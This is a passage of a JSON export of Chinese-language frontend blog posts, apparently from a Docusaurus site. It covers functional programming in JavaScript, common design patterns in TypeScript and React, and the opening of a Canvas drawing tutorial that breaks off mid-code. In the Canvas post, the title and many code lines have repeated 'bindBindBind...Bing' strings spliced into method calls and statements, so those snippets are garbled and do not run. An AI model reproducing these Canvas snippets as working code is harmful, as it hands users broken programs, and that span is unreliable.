35, active: true },\\n];\\n\\nconst getActiveUsers = users => users.filter(u => u.active);\\nconst getNames = users => users.map(u => u.name);\\nconst sortNames = names => [...names].sort();\\nconst formatList = names => names.join(\', \');\\n\\nconst getActiveUserList = pipe(\\n  getActiveUsers,\\n  getNames,\\n  sortNames,\\n  formatList\\n);\\n\\ngetActiveUserList(users);  // \\"Bob, John\\"\\n```\\n\\n---\\n\\n## \ud83d\udce6 \u5e38\u7528\u51fd\u6570\u5f0f\u5de5\u5177\\n\\n### map \u5b9e\u73b0\\n\\n```javascript\\nconst map = (fn) => (arr) => arr.map(fn);\\n\\nconst double = map(x => x * 2);\\ndouble([1, 2, 3]);  // [2, 4, 6]\\n```\\n\\n### filter \u5b9e\u73b0\\n\\n```javascript\\nconst filter = (predicate) => (arr) => arr.filter(predicate);\\n\\nconst isEven = filter(x => x % 2 === 0);\\nisEven([1, 2, 3, 4]);  // [2, 4]\\n```\\n\\n### reduce \u5b9e\u73b0\\n\\n```javascript\\nconst reduce = (fn, initial) => (arr) => arr.reduce(fn, initial);\\n\\nconst sum = reduce((a, b) => a + b, 0);\\nsum([1, 2, 3, 4]);  // 10\\n```\\n\\n### \u7ec4\u5408\u4f7f\u7528\\n\\n```javascript\\nconst processNumbers = pipe(\\n  filter(x => x > 0),\\n  map(x => x * 2),\\n  reduce((a, b) => a + b, 0)\\n);\\n\\nprocessNumbers([-1, 1, 2, 3]);  // 12\\n```\\n\\n---\\n\\n## \ud83c\udfad \u51fd\u5b50\u548c Monad\\n\\n### Maybe \u51fd\u5b50\\n\\n```javascript\\nclass Maybe {\\n  constructor(value) {\\n    this.value = value;\\n  }\\n\\n  static of(value) {\\n    return new Maybe(value);\\n  }\\n\\n  isNothing() {\\n    return this.value === null || this.value === undefined;\\n  }\\n\\n  map(fn) {\\n    return this.isNothing() ? this : Maybe.of(fn(this.value));\\n  }\\n\\n  getOrElse(defaultValue) {\\n    return this.isNothing() ? defaultValue : this.value;\\n  }\\n}\\n\\n// \u5b89\u5168\u7684\u5c5e\u6027\u8bbf\u95ee\\nconst user = { profile: { name: \'John\' } };\\n\\nMaybe.of(user)\\n  .map(u => u.profile)\\n  .map(p => p.name)\\n  .getOrElse(\'Unknown\');  // \'John\'\\n\\nMaybe.of(null)\\n  .map(u => u.profile)\\n  .map(p => p.name)\\n  .getOrElse(\'Unknown\');  // \'Unknown\'\\n```\\n\\n### Either \u51fd\u5b50\\n\\n```javascript\\nclass Either {\\n  constructor(left, right) {\\n    this.left = left;\\n    this.right = right;\\n  }\\n\\n  static left(value) {\\n    return new Either(value, null);\\n  }\\n\\n  static right(value) {\\n    return new Either(null, value);\\n  }\\n\\n  map(fn) {\\n    return this.right !== null\\n      ? Either.right(fn(this.right))\\n      : this;\\n  }\\n\\n  fold(leftFn, rightFn) {\\n    return this.right !== null\\n      ? rightFn(this.right)\\n      : leftFn(this.left);\\n  }\\n}\\n\\n// \u9519\u8bef\u5904\u7406\\nfunction divide(a, b) {\\n  return b === 0\\n    ? Either.left(\'Cannot divide by zero\')\\n    : Either.right(a / b);\\n}\\n\\ndivide(10, 2)\\n  .map(x => x * 2)\\n  .fold(\\n    error => console.log(\'Error:\', error),\\n    result => console.log(\'Result:\', result)\\n  );\\n```\\n\\n---\\n\\n## \ud83d\udccb React \u4e2d\u7684\u51fd\u6570\u5f0f\\n\\n```tsx\\n// \u7eaf\u7ec4\u4ef6\\nconst UserCard = ({ name, avatar }: { name: string; avatar: string }) => (\\n  <div className=\\"card\\">\\n    <img src={avatar} alt={name} />\\n    <h3>{name}</h3>\\n  </div>\\n);\\n\\n// \u7ec4\u5408 Hooks\\nconst useUser = (id: string) => {\\n  const user = useQuery([\'user\', id], () => fetchUser(id));\\n  return user;\\n};\\n\\nconst useFormattedUser = (id: string) => {\\n  const user = useUser(id);\\n  return useMemo(() => formatUser(user.data), [user.data]);\\n};\\n\\n// \u9ad8\u9636\u7ec4\u4ef6\\nconst withLoading = <P extends object>(\\n  Component: React.ComponentType<P>\\n) => {\\n  return ({ isLoading, ...props }: P & { isLoading: boolean }) => {\\n    if (isLoading) return <Loading />;\\n    return <Component {...(props as P)} />;\\n  };\\n};\\n```\\n\\n---\\n\\n## \u2705 \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n1. \u4f18\u5148\u4f7f\u7528\u7eaf\u51fd\u6570\\n2. \u907f\u514d\u4fee\u6539\u53c2\u6570\\n3. \u4f7f\u7528 const \u548c\u4e0d\u53ef\u53d8\u6570\u636e\\n4. \u5c06\u526f\u4f5c\u7528\u9694\u79bb\u5230\u8fb9\u754c\\n5. \u4f7f\u7528\u5c0f\u800c\u4e13\u6ce8\u7684\u51fd\u6570\\n6. \u901a\u8fc7\u7ec4\u5408\u6784\u5efa\u590d\u6742\u529f\u80fd\\n```\\n\\n---\\n\\n\u51fd\u6570\u5f0f\u7f16\u7a0b\u4e0d\u662f\u5168\u6709\u6216\u5168\u65e0\u3002\u5728\u5408\u9002\u7684\u5730\u65b9\u4f7f\u7528\u51fd\u6570\u5f0f\u6280\u672f\uff0c\u53ef\u4ee5\u8ba9\u4ee3\u7801\u66f4\u6e05\u6670\u53ef\u7ef4\u62a4\u3002"},{"id":"design-patterns-frontend","metadata":{"permalink":"/blog/design-patterns-frontend","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-04-25-design-patterns.md","source":"@site/blog/2025-04-25-design-patterns.md","title":"\u8bbe\u8ba1\u6a21\u5f0f\u5728\u524d\u7aef\u7684\u5e94\u7528","description":"\u8bbe\u8ba1\u6a21\u5f0f\u662f\u89e3\u51b3\u5e38\u89c1\u95ee\u9898\u7684\u7ecf\u5178\u65b9\u6848\u3002\u672c\u6587\u4ecb\u7ecd\u5728\u524d\u7aef\u5f00\u53d1\u4e2d\u6700\u5b9e\u7528\u7684\u8bbe\u8ba1\u6a21\u5f0f\u3002","date":"2025-04-25T00:00:00.000Z","tags":[{"inline":true,"label":"\u8bbe\u8ba1\u6a21\u5f0f","permalink":"/blog/tags/\u8bbe\u8ba1\u6a21\u5f0f"},{"inline":true,"label":"\u67b6\u6784","permalink":"/blog/tags/\u67b6\u6784"},{"inline":true,"label":"JavaScript","permalink":"/blog/tags/java-script"}],"readingTime":5.35,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"design-patterns-frontend","title":"\u8bbe\u8ba1\u6a21\u5f0f\u5728\u524d\u7aef\u7684\u5e94\u7528","authors":"mason","tags":["\u8bbe\u8ba1\u6a21\u5f0f","\u67b6\u6784","JavaScript"]},"unlisted":false,"prevItem":{"title":"\u51fd\u6570\u5f0f\u7f16\u7a0b\u5b9e\u8df5","permalink":"/blog/functional-programming"},"nextItem":{"title":"Canvas bindBindBindBindBindBindBindBindBing\u4e0e\u52a8\u753b","permalink":"/blog/canvas-bindbindbindbindbindbindbindbindbing"}},"content":"\u8bbe\u8ba1\u6a21\u5f0f\u662f\u89e3\u51b3\u5e38\u89c1\u95ee\u9898\u7684\u7ecf\u5178\u65b9\u6848\u3002\u672c\u6587\u4ecb\u7ecd\u5728\u524d\u7aef\u5f00\u53d1\u4e2d\u6700\u5b9e\u7528\u7684\u8bbe\u8ba1\u6a21\u5f0f\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4e3a\u4ec0\u4e48\u5b66\u4e60\u8bbe\u8ba1\u6a21\u5f0f\\n\\n```markdown\\n- \u63d0\u4f9b\u901a\u7528\u7684\u89e3\u51b3\u65b9\u6848\\n- \u63d0\u9ad8\u4ee3\u7801\u53ef\u7ef4\u62a4\u6027\\n- \u4fbf\u4e8e\u56e2\u961f\u6c9f\u901a\\n- \u7406\u89e3\u6846\u67b6\u6e90\u7801\\n```\\n\\n---\\n\\n## \ud83c\udfed \u5355\u4f8b\u6a21\u5f0f\\n\\n\u786e\u4fdd\u4e00\u4e2a\u7c7b\u53ea\u6709\u4e00\u4e2a\u5b9e\u4f8b\u3002\\n\\n```typescript\\n// \u57fa\u7840\u5b9e\u73b0\\nclass Singleton {\\n  private static instance: Singleton;\\n\\n  private constructor() {}\\n\\n  static getInstance(): Singleton {\\n    if (!Singleton.instance) {\\n      Singleton.instance = new Singleton();\\n    }\\n    return Singleton.instance;\\n  }\\n}\\n\\n// \u4f7f\u7528\\nconst a = Singleton.getInstance();\\nconst b = Singleton.getInstance();\\nconsole.log(a === b); // true\\n```\\n\\n### \u5b9e\u9645\u5e94\u7528\\n\\n```typescript\\n// \u5168\u5c40\u72b6\u6001\u7ba1\u7406\\nclass Store {\\n  private static instance: Store;\\n  private state: Record<string, any> = {};\\n\\n  private constructor() {}\\n\\n  static getInstance(): Store {\\n    if (!Store.instance) {\\n      Store.instance = new Store();\\n    }\\n    return Store.instance;\\n  }\\n\\n  get(key: string) {\\n    return this.state[key];\\n  }\\n\\n  set(key: string, value: any) {\\n    this.state[key] = value;\\n  }\\n}\\n\\n// \u6a21\u6001\u6846\u7ba1\u7406\\nclass ModalManager {\\n  private static instance: ModalManager;\\n  private modals: Map<string, boolean> = new Map();\\n\\n  static getInstance() {\\n    if (!ModalManager.instance) {\\n      ModalManager.instance = new ModalManager();\\n    }\\n    return ModalManager.instance;\\n  }\\n\\n  open(id: string) {\\n    this.modals.set(id, true);\\n  }\\n\\n  close(id: string) {\\n    this.modals.set(id, false);\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udc40 \u89c2\u5bdf\u8005\u6a21\u5f0f\\n\\n\u5b9a\u4e49\u5bf9\u8c61\u95f4\u7684\u4e00\u5bf9\u591a\u4f9d\u8d56\uff0c\u5f53\u4e00\u4e2a\u5bf9\u8c61\u6539\u53d8\u65f6\uff0c\u6240\u6709\u4f9d\u8d56\u8005\u90fd\u4f1a\u6536\u5230\u901a\u77e5\u3002\\n\\n```typescript\\n// \u4e8b\u4ef6\u53d1\u5c04\u5668\\nclass EventEmitter {\\n  private events: Map<string, Function[]> = new Map();\\n\\n  on(event: string, callback: Function) {\\n    if (!this.events.has(event)) {\\n      this.events.set(event, []);\\n    }\\n    this.events.get(event)!.push(callback);\\n  }\\n\\n  off(event: string, callback: Function) {\\n    const callbacks = this.events.get(event);\\n    if (callbacks) {\\n      const index = callbacks.indexOf(callback);\\n      if (index > -1) {\\n        callbacks.splice(index, 1);\\n      }\\n    }\\n  }\\n\\n  emit(event: string, ...args: any[]) {\\n    const callbacks = this.events.get(event);\\n    if (callbacks) {\\n      callbacks.forEach(cb => cb(...args));\\n    }\\n  }\\n\\n  once(event: string, callback: Function) {\\n    const wrapper = (...args: any[]) => {\\n      callback(...args);\\n      this.off(event, wrapper);\\n    };\\n    this.on(event, wrapper);\\n  }\\n}\\n\\n// \u4f7f\u7528\\nconst emitter = new EventEmitter();\\n\\nemitter.on(\'userLogin\', (user) => {\\n  console.log(`${user.name} logged in`);\\n});\\n\\nemitter.emit(\'userLogin\', { name: \'John\' });\\n```\\n\\n### React \u4e2d\u7684\u89c2\u5bdf\u8005\\n\\n```tsx\\n// \u81ea\u5b9a\u4e49 Hook\\nfunction useObservable<T>(observable: Observable<T>) {\\n  const [value, setValue] = useState<T>();\\n\\n  useEffect(() => {\\n    const subscription = observable.subscribe(setValue);\\n    return () => subscription.unsubscribe();\\n  }, [observable]);\\n\\n  return value;\\n}\\n```\\n\\n---\\n\\n## \ud83c\udfa8 \u5de5\u5382\u6a21\u5f0f\\n\\n\u5c06\u5bf9\u8c61\u521b\u5efa\u903b\u8f91\u5c01\u88c5\uff0c\u6839\u636e\u6761\u4ef6\u521b\u5efa\u4e0d\u540c\u5bf9\u8c61\u3002\\n\\n```typescript\\n// \u7b80\u5355\u5de5\u5382\\ninterface Button {\\n  render(): void;\\n}\\n\\nclass PrimaryButton implements Button {\\n  render() {\\n    console.log(\'Rendering primary button\');\\n  }\\n}\\n\\nclass SecondaryButton implements Button {\\n  render() {\\n    console.log(\'Rendering secondary button\');\\n  }\\n}\\n\\nclass ButtonFactory {\\n  static create(type: \'primary\' | \'secondary\'): Button {\\n    switch (type) {\\n      case \'primary\':\\n        return new PrimaryButton();\\n      case \'secondary\':\\n        return new SecondaryButton();\\n      default:\\n        throw new Error(`Unknown button type: ${type}`);\\n    }\\n  }\\n}\\n\\n// \u4f7f\u7528\\nconst button = ButtonFactory.create(\'primary\');\\nbutton.render();\\n```\\n\\n### React \u7ec4\u4ef6\u5de5\u5382\\n\\n```tsx\\n// \u56fe\u6807\u5de5\u5382\\nconst icons = {\\n  home: HomeIcon,\\n  user: UserIcon,\\n  settings: SettingsIcon,\\n};\\n\\nfunction IconFactory({ name, ...props }: { name: keyof typeof icons }) {\\n  const Icon = icons[name];\\n  return Icon ? <Icon {...props} /> : null;\\n}\\n\\n// \u8868\u5355\u63a7\u4ef6\u5de5\u5382\\nconst formControls = {\\n  text: TextInput,\\n  select: SelectInput,\\n  checkbox: CheckboxInput,\\n};\\n\\nfunction FormField({ type, ...props }: { type: keyof typeof formControls }) {\\n  const Control = formControls[type];\\n  return <Control {...props} />;\\n}\\n```\\n\\n---\\n\\n## \ud83c\udfad \u7b56\u7565\u6a21\u5f0f\\n\\n\u5b9a\u4e49\u4e00\u7cfb\u5217\u7b97\u6cd5\uff0c\u5c06\u6bcf\u4e2a\u7b97\u6cd5\u5c01\u88c5\u8d77\u6765\uff0c\u4f7f\u5b83\u4eec\u53ef\u4ee5\u4e92\u6362\u3002\\n\\n```typescript\\n// \u8868\u5355\u9a8c\u8bc1\u7b56\u7565\\ninterface ValidationStrategy {\\n  validate(value: string): boolean;\\n  message: string;\\n}\\n\\nconst strategies: Record<string, ValidationStrategy> = {\\n  required: {\\n    validate: (value) => value.length > 0,\\n    message: \'\u6b64\u5b57\u6bb5\u5fc5\u586b\',\\n  },\\n  email: {\\n    validate: (value) => /^[^\\\\s@]+@[^\\\\s@]+\\\\.[^\\\\s@]+$/.test(value),\\n    message: \'\u8bf7\u8f93\u5165\u6709\u6548\u7684\u90ae\u7bb1\',\\n  },\\n  minLength: {\\n    validate: (value) => value.length >= 6,\\n    message: \'\u957f\u5ea6\u81f3\u5c11 6 \u4e2a\u5b57\u7b26\',\\n  },\\n};\\n\\nclass Validator {\\n  private rules: string[] = [];\\n\\n  addRule(rule: string) {\\n    this.rules.push(rule);\\n    return this;\\n  }\\n\\n  validate(value: string): { valid: boolean; errors: string[] } {\\n    const errors: string[] = [];\\n\\n    for (const rule of this.rules) {\\n      const strategy = strategies[rule];\\n      if (strategy && !strategy.validate(value)) {\\n        errors.push(strategy.message);\\n      }\\n    }\\n\\n    return { valid: errors.length === 0, errors };\\n  }\\n}\\n\\n// \u4f7f\u7528\\nconst validator = new Validator()\\n  .addRule(\'required\')\\n  .addRule(\'email\');\\n\\nconsole.log(validator.validate(\'test@example.com\'));\\n```\\n\\n### \u4ef7\u683c\u8ba1\u7b97\u7b56\u7565\\n\\n```typescript\\ntype PriceStrategy = (price: number) => number;\\n\\nconst priceStrategies: Record<string, PriceStrategy> = {\\n  normal: (price) => price,\\n  member: (price) => price * 0.9,\\n  vip: (price) => price * 0.8,\\n  superVip: (price) => price * 0.7,\\n};\\n\\nfunction calculatePrice(price: number, userType: string): number {\\n  const strategy = priceStrategies[userType] || priceStrategies.normal;\\n  return strategy(price);\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd0c \u9002\u914d\u5668\u6a21\u5f0f\\n\\n\u5c06\u4e00\u4e2a\u63a5\u53e3\u8f6c\u6362\u6210\u53e6\u4e00\u4e2a\u63a5\u53e3\u3002\\n\\n```typescript\\n// \u65e7\u7684 API\\nclass OldApi {\\n  request(url: string, callback: (data: any) => void) {\\n    // \u56de\u8c03\u5f62\u5f0f\\n    setTimeout(() => callback({ data: \'old api\' }), 100);\\n  }\\n}\\n\\n// \u9002\u914d\u5668\\nclass ApiAdapter {\\n  private oldApi: OldApi;\\n\\n  constructor(oldApi: OldApi) {\\n    this.oldApi = oldApi;\\n  }\\n\\n  // \u8f6c\u6362\u4e3a Promise\\n  async fetch(url: string): Promise<any> {\\n    return new Promise((resolve) => {\\n      this.oldApi.request(url, resolve);\\n    });\\n  }\\n}\\n\\n// \u4f7f\u7528\\nconst adapter = new ApiAdapter(new OldApi());\\nconst data = await adapter.fetch(\'/api/users\');\\n```\\n\\n### \u7b2c\u4e09\u65b9\u5e93\u9002\u914d\\n\\n```typescript\\n// \u9002\u914d\u4e0d\u540c\u7684\u5b58\u50a8\\ninterface Storage {\\n  get(key: string): Promise<string | null>;\\n  set(key: string, value: string): Promise<void>;\\n  remove(key: string): Promise<void>;\\n}\\n\\nclass LocalStorageAdapter implements Storage {\\n  async get(key: string) {\\n    return localStorage.getItem(key);\\n  }\\n  async set(key: string, value: string) {\\n    localStorage.setItem(key, value);\\n  }\\n  async remove(key: string) {\\n    localStorage.removeItem(key);\\n  }\\n}\\n\\nclass IndexedDBAdapter implements Storage {\\n  // IndexedDB \u5b9e\u73b0\\n}\\n\\nclass AsyncStorageAdapter implements Storage {\\n  // React Native AsyncStorage \u5b9e\u73b0\\n}\\n```\\n\\n---\\n\\n## \ud83c\udf81 \u88c5\u9970\u5668\u6a21\u5f0f\\n\\n\u52a8\u6001\u5730\u7ed9\u5bf9\u8c61\u6dfb\u52a0\u65b0\u529f\u80fd\u3002\\n\\n```typescript\\n// \u51fd\u6570\u88c5\u9970\u5668\\nfunction debounce<T extends (...args: any[]) => any>(\\n  fn: T,\\n  delay: number\\n): T {\\n  let timer: NodeJS.Timeout;\\n  return function (...args: Parameters<T>) {\\n    clearTimeout(timer);\\n    timer = setTimeout(() => fn(...args), delay);\\n  } as T;\\n}\\n\\nfunction memoize<T extends (...args: any[]) => any>(fn: T): T {\\n  const cache = new Map();\\n  return function (...args: Parameters<T>) {\\n    const key = JSON.stringify(args);\\n    if (cache.has(key)) {\\n      return cache.get(key);\\n    }\\n    const result = fn(...args);\\n    cache.set(key, result);\\n    return result;\\n  } as T;\\n}\\n\\n// \u4f7f\u7528\\nconst search = debounce((query: string) => {\\n  console.log(\'Searching:\', query);\\n}, 300);\\n\\nconst fibonacci = memoize((n: number): number => {\\n  if (n <= 1) return n;\\n  return fibonacci(n - 1) + fibonacci(n - 2);\\n});\\n```\\n\\n### TypeScript \u88c5\u9970\u5668\\n\\n```typescript\\n// \u65b9\u6cd5\u88c5\u9970\u5668\\nfunction log(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n  const original = descriptor.value;\\n  descriptor.value = function (...args: any[]) {\\n    console.log(`Calling ${propertyKey} with`, args);\\n    const result = original.apply(this, args);\\n    console.log(`Result:`, result);\\n    return result;\\n  };\\n}\\n\\nclass Calculator {\\n  @log\\n  add(a: number, b: number) {\\n    return a + b;\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd17 \u4ee3\u7406\u6a21\u5f0f\\n\\n\u4e3a\u5bf9\u8c61\u63d0\u4f9b\u4e00\u4e2a\u4ee3\u7406\uff0c\u63a7\u5236\u5bf9\u539f\u5bf9\u8c61\u7684\u8bbf\u95ee\u3002\\n\\n```typescript\\n// \u56fe\u7247\u61d2\u52a0\u8f7d\u4ee3\u7406\\nclass ImageProxy {\\n  private realImage: HTMLImageElement | null = null;\\n  private src: string;\\n  private placeholder: string;\\n\\n  constructor(src: string, placeholder: string) {\\n    this.src = src;\\n    this.placeholder = placeholder;\\n  }\\n\\n  display(container: HTMLElement) {\\n    // \u5148\u663e\u793a\u5360\u4f4d\u56fe\\n    const img = document.createElement(\'img\');\\n    img.src = this.placeholder;\\n    container.appendChild(img);\\n\\n    // \u5f02\u6b65\u52a0\u8f7d\u771f\u5b9e\u56fe\u7247\\n    const realImg = new Image();\\n    realImg.onload = () => {\\n      img.src = this.src;\\n    };\\n    realImg.src = this.src;\\n  }\\n}\\n\\n// \u4f7f\u7528 Proxy \u5b9e\u73b0\\nconst createReactiveObject = <T extends object>(obj: T, onChange: () => void) => {\\n  return new Proxy(obj, {\\n    set(target, key, value) {\\n      const result = Reflect.set(target, key, value);\\n      onChange();\\n      return result;\\n    },\\n  });\\n};\\n```\\n\\n---\\n\\n## \ud83d\udccb \u6a21\u5f0f\u9009\u62e9\\n\\n| \u573a\u666f | \u63a8\u8350\u6a21\u5f0f |\\n|------|----------|\\n| \u5168\u5c40\u552f\u4e00\u5b9e\u4f8b | \u5355\u4f8b |\\n| \u4e8b\u4ef6\u5904\u7406 | \u89c2\u5bdf\u8005 |\\n| \u6761\u4ef6\u521b\u5efa\u5bf9\u8c61 | \u5de5\u5382 |\\n| \u7b97\u6cd5\u66ff\u6362 | \u7b56\u7565 |\\n| \u63a5\u53e3\u8f6c\u6362 | \u9002\u914d\u5668 |\\n| \u529f\u80fd\u589e\u5f3a | \u88c5\u9970\u5668 |\\n| \u8bbf\u95ee\u63a7\u5236 | \u4ee3\u7406 |\\n\\n---\\n\\n\u8bbe\u8ba1\u6a21\u5f0f\u4e0d\u662f\u4e07\u80fd\u7684\uff0c\u8fc7\u5ea6\u4f7f\u7528\u4f1a\u589e\u52a0\u590d\u6742\u5ea6\u3002\u5728\u5408\u9002\u7684\u573a\u666f\u4f7f\u7528\u5408\u9002\u7684\u6a21\u5f0f\u3002"},{"id":"canvas-bindbindbindbindbindbindbindbindbing","metadata":{"permalink":"/blog/canvas-bindbindbindbindbindbindbindbindbing","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-04-10-canvas.md","source":"@site/blog/2025-04-10-canvas.md","title":"Canvas bindBindBindBindBindBindBindBindBing\u4e0e\u52a8\u753b","description":"Canvas \u662f Web \u7ed1\u5b9a\u4e0e\u52a8\u753b\u7684\u57fa\u7840\u3002\u672c\u6587\u4ecb\u7ecd Canvas API \u548c\u52a8\u753b\u5b9e\u73b0\u6280\u5de7\u3002","date":"2025-04-10T00:00:00.000Z","tags":[{"inline":true,"label":"Canvas","permalink":"/blog/tags/canvas"},{"inline":true,"label":"\u52a8\u753b","permalink":"/blog/tags/\u52a8\u753b"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"}],"readingTime":3.73,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"canvas-bindbindbindbindbindbindbindbindbing","title":"Canvas bindBindBindBindBindBindBindBindBing\u4e0e\u52a8\u753b","authors":"mason","tags":["Canvas","\u52a8\u753b","\u524d\u7aef"]},"unlisted":false,"prevItem":{"title":"\u8bbe\u8ba1\u6a21\u5f0f\u5728\u524d\u7aef\u7684\u5e94\u7528","permalink":"/blog/design-patterns-frontend"},"nextItem":{"title":"\u6570\u636e\u53ef\u89c6\u5316\u5165\u95e8 (ECharts)","permalink":"/blog/data-visualization"}},"content":"Canvas \u662f Web \u7ed1\u5b9a\u4e0e\u52a8\u753b\u7684\u57fa\u7840\u3002\u672c\u6587\u4ecb\u7ecd Canvas API \u548c\u52a8\u753b\u5b9e\u73b0\u6280\u5de7\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf Canvas \u57fa\u7840\\n\\n### \u521b\u5efa Canvas\\n\\n```html\\n<canvas id=\\"canvas\\" width=\\"800\\" height=\\"600\\"></canvas>\\n```\\n\\n```javascript\\nconst canvas = document.getElementById(\'canvas\');\\nconst ctx = canvas.getContext(\'2d\');\\n\\n// \u9ad8\u6e05\u5c4f\u9002\u914d\\nfunction setupCanvas(canvas) {\\n  const dpr = window.devicePixelRatio || 1;\\n  const rect = canvas.getBoundingClientRect();\\n  \\n  canvas.width = rect.width * dpr;\\n  canvas.height = rect.height * dpr;\\n  canvas.style.width = `${rect.width}px`;\\nbindcanvas.style.height = `${rect.height}px`;bindbin\\n  \\n  const ctx = canvas.getContext bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing(\'2d\');\\n  ctx.scale(dpr, dpr);\\n  \\n  return ctx;\\n}\\n```\\n\\n---\\n\\n## bindbindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing\u7ed1\u5b9a\u5f62\u72b6\\n\\n### \u77e9\u5f62\\n\\n```javascript\\n// \u586b\u5145\u77e9\u5f62\\nctx.fillStyle = \'#3b82f6\';\\nctx bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing.bindBindBindBindBindBindBindBindBingfillRect(10, 10, 100, 50);\\n\\n// \u63cf\u8fb9\u77e9\u5f62\\nctx.strokeStyle = \'#10b981\';\\nctx.bindBindBindBindBindBindBindBindBinglineWidth = 2;\\nctx.strokeRect(10, 80, 100, 50);\\n\\n// \u6e05\u9664\u77e9\u5f62\\nctx.clearRect(0, 0, canvas.width, canvas.height);\\n```\\n\\n### \u8def\u5f84\\n\\n```javascript\\n// \u4e09\u89d2\u5f62\\nctx.beginPath();\\nctx.moveTo(50, 10);\\nctx.lineTo(10, 90);\\nctx.lineTo(90, 90);\\nctx.closePath bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing();\\n\\nctx.fillStyle = \'#f59e0b\';\\nctx.fill();\\nctx.strokeStyle = \'#000\';\\nctx.stroke();\\n```\\n\\n### \u5706\u5f62\\n\\n```javascript\\n// \u5706\\nctx.beginPath();\\nctx.arc(100, 100, 50, 0, Math.PI * 2);\\nctx.fillStyle = \'#ef4444\';\\nctx.fill();\\n\\n// \u5706\u5f27\\nctx.beginPath();\\nctx.arc(200, 100, 50, 0, Math.PI);  // \u534a\u5706\\nctx.stroke();\\n```\\n\\n### \u5706\u89d2\u77e9\u5f62\\n\\n```javascript\\nfunction roundRect(ctx, x, y, width, height, radius) {\\n  ctx.beginPath();\\n  ctx.moveTo(x + radius, y);\\n  ctx.lineTo(x + width - radius, y);\\n  ctx.arcTo(x + width, y, x + width, y + height, radius);\\n  ctx.lineTo(x + width, y + height - radius);\\n  ctx.arcTo(x + width, y + height, x, y + height, radius);\\n  ctx.lineTo(x + radius, y + height);\\n  ctx.arcTo(x, y + height, x, y, radius);\\n  ctx.lineTo(x, y + radius);\\n  ctx.arcTo(x, y, x + width, y, radius);\\n  ctx.closePath();\\n}\\n\\nroundRect(ctx, 10, 10, 100, 60, 10);\\nctx.fill();\\n```\\n\\n---\\n\\n## \ud83c\udfa8 \u6837\u5f0f\\n\\n### \u989c\u8272\u548c\u586b\u5145\\n\\n```javascript\\n// \u7eaf\u8272\\nctx.fillStyle = \'#3b82f6\';\\nctx.fillStyle = \'rgba(59, 130, 246, 0.5)\';\\n\\n// \u7ebf\u6027\u6e10\u53d8\\nconst gradient = ctx.createLinearGradient(0, 0, 200, 0);\\ngradient.addColorStop(0, \'#3b82f6\');\\ngradient.addColorStop(1, \'#10b981\');\\nctx.fillStyle = gradient;\\n\\n// \u5f84\u5411\u6e10\u53d8\\nconst radial = ctx.createRadialGradient(100, 100, 0, 100, 100, 100);\\nradial.addColorStop(0, \'#fff\');\\nradial.addColorStop(1, \'#3b82f6\');\\nctx.fillStyle = radial;\\n```\\n\\n### \u9634\u5f71\\n\\n```javascript\\nctx.shadowColor = \'rgba(0, 0, 0, 0.3)\';\\nctx.shadowBlur = 10;\\nctx.shadowOffsetX = 5;\\nctx.shadowOffsetY = 5;\\n\\nctx.fillRect(50, 50, 100, 100);\\n```\\n\\n### \u7ebf\u6761\u6837\u5f0f\\n\\n```javascript\\nctx.lineWidth = 4;\\nctx.lineCap = \'round\';    // \'butt\' | \'round\' | \'square\'\\nctx.lineJoin = \'round\';   // \'bevel\' | \'round\' | \'miter\'\\nctx.setLineDash([5, 3]);  // \u865a\u7ebf\\n```\\n\\n---\\n\\n## \ud83d\udcdd \u6587\u672c\\n\\n```javascript\\nctx.font = \'24px Arial\';\\nctx.fillStyle = \'#333\';\\nctx.textAlign = \'center\';     // \'left\' | \'center\' | \'right\'\\nctx.textBaseline = \'middle\';  // \'top\' | \'middle\' | \'bottom\'\\n\\nctx.fillText(\'Hello Canvas\', 200, 100);\\nctx.strokeText(\'Outlined Text\', 200, 150);\\n\\n// \u6d4b\u91cf\u6587\u672c\\nconst metrics = ctx.measureText(\'Hello\');\\nconsole.log(metrics.width);\\n```\\n\\n---\\n\\n## \ud83d\uddbc\ufe0f \u56fe\u7247\\n\\n```javascript\\nconst img = new Image();\\nimg.onload = () => {bindBindBindBindBindBindBindBindBing\\n  // \u7ed1\u5b9a\u56fe\u7247\\n  ctx.bindBindBindBindBindBindBindBindBingdrawImage(img, 0, 0);\\n  \\n  // \u7f29\u653e\\n  ctx.drawImage(img, 0, 0, 200, 150);\\n  \\n  // \u88c1\u526a\\n  ctx.drawImage(\\n    img,\\n    sx, sy, sWidth, sHeight,  // \u6e90\\n    dx, dy, dWidth, dHeight   // \u76ee\u6807\\n  );\\n};\\nimg.src = \'image.png\';\\n```\\n\\n---\\n\\n## \ud83d\udd04 \u53d8\u6362\\n\\n```javascript\\n// \u4fdd\u5b58/\u6062\u590d\u72b6\u6001\\nctx.save();\\n\\n// 